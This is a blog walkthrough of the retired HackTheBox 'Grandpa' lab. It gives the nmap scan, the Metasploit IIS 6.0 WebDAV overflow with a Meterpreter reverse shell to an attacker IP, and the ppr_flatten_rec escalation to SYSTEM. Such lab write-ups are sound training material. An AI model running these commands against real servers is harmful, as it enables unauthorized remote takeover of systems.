<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Grandpa Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-grandpa-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-03-23T14:51:54+00:00">March 23, 2018</time><time class="updated" datetime="2025-07-07T16:28:59+00:00">July 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “<strong>Grandpa</strong>” which is lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level. They have a collection of vulnerable labs as challenges from beginners to Expert level. HTB have two partitions of lab i.e. Active and retired since we can’t submit write up of any Active lab, therefore, we have chosen retried Grandpa Lab.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Beginners</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file in the victim’s machine.</span></p>
<h5><span style="color: #000000;">Let’s begin the Game!!</span></h5>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of Grandpa is <strong>10.10.10.14</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -sV 10.10.10.14</pre>
<p><span style="color: #000000;">From nmap result I found the following information.</span></p>
<p><span style="color: #000000;"><strong>Open port:</strong> <strong>80 </strong>for HTTP</span></p>
<p><span style="color: #000000;"><strong>Service version</strong>: Microsoft <strong>IIS httpd 6.0</strong></span></p>
<p><span style="color: #000000;"><strong>OS</strong>: Windows machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5XxjSyqCCm8/WrURsAnJkLI/AAAAAAAAVi4/KfAVBAQYUmQOh9XUhZ6doD16v86dcFkMQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Then I used <strong>searchsploit for iis 6.0</strong> and found a Remote Buffer overflow vulnerability in Microsoft <strong>IIS httpd 6.0, </strong>you can check this exploit in google also.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-csJu4Zmo7po/WrURsIURqPI/AAAAAAAAVi0/h_AS3eCmlxMddw-fkT61TvPQB6rkiUFnwCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Then I run <strong>the msfconsole</strong> command in the terminal and load Metasploit framework for using Microsoft IIS WebDAV ScStoragePathFromUrl Overflow module for exploiting target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set rhost 10.10.10.14
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set payload windows/meterpreter/reverse_tcp
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set lhost 10.10.14.3
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set lport 4444
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) run</pre>
<p><span style="color: #000000;"><strong>Terrific!!</strong> I have got unauthorized access of victims command shell through <strong>session 1</strong> as shown in below image.</span></p>
<p><span style="color: #000000;">Then I run command <strong>getuid</strong> for identifying user ID and current process but it failed due to limited shell access we have in session 1 and now we need to privilege escalation.</span></p>
<p><span style="color: #000000;">For that <strong>background</strong> your current meterpreter shell and go for post exploitation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-GNgF1O5lEqo/WrUTpXFHTdI/AAAAAAAAVjw/o3XwI0ZM9OIr3urktDURi6Vki0VOsv79ACLcBGAs/s1600/u.png"/></span></p>
<p><span style="color: #000000;">Then I run a post-exploit “Multi Recon Local Exploit Suggester” that identifies local meterpreter exploits for further exploitation. The tool recommends exploits based on the architecture and platform of the user’s open shell, as well as the available exploits in meterpreter.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) &gt; set session 1
msf post(multi/recon/local_exploit_suggester) &gt; run</pre>
<p><span style="color: #000000;"><strong>Wonderful!!</strong> Exploit Suggester truly proof itself by suggesting another exploit name to which target is vulnerable. So now we will go with the last option as highlighted in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Zkd8MbqWVQE/WrURs5Q1feI/AAAAAAAAVjE/Y-pP-UlOiowQFvRIJQ34f6Gtn4ORQza6gCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">At this time use pprFlattenRec Local Privilege Escalation module for making unauthorized access again but as privileged user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ppr_flatten_rec
msf exploit(windows/local/ppr_flatten_rec) &gt; set lhost 10.10.14.3
msf exploit(windows/local/ppr_flatten_rec) &gt; set lport 4455
msf exploit(windows/local/ppr_flatten_rec) &gt; run</pre>
<p><span style="color: #000000;"><strong>Nice!!</strong> It works and we got meterpreter session 2 as system user and you can check in below image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; getuid</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZcC4ZJd4UGI/WrURtMP20iI/AAAAAAAAVjI/5QMRA0uEDk0FXak2iq2d1kjC8EnwYiABwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now let’s complete this task by searching for the user.txt and root.txt flag which someone has hidden somewhere inside a directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; shell</pre>
<p><span style="color: #000000;">Inside <strong>C:\Document and Setting\Harry\Desktop</strong> I found <strong>the user.txt</strong> file and used the type “filename” command for reading this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">type user.txt</pre>
<h5><span style="color: #000000;"><strong>Great!!</strong> We got our 1<sup>st</sup> flag successfully</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vx_XE6ac23c/WrURtERBufI/AAAAAAAAVjM/oNd6BH5-0JAyQjZi1n41MXK3x_drfVK9ACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Inside <strong>C:\Document and Setting\Administrtator\Desktop</strong> I found <strong>the root.txt</strong> file and used the type “filename” command for reading this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">type root.txt</pre>
<h5><span style="color: #000000;"><strong>Great!!</strong> We got our 2nd flag successfully</span></h5>
<p><span style="color: #000000;">Breaching this lab was an interesting and enjoyable moment for me. It will take less time if you are aware of proper Metasploit exploits. Therefore I will give all <strong>Glory to Metasploit</strong> for making this challenge easy for me.</span></p>
<p><span style="color: #000000;"><strong>Happy Hacking!!</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-btu264Kec0k/WrURtY0ubXI/AAAAAAAAVjQ/6-xRMGB7BG0zG0shj5YERaUWNo04y7PmwCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
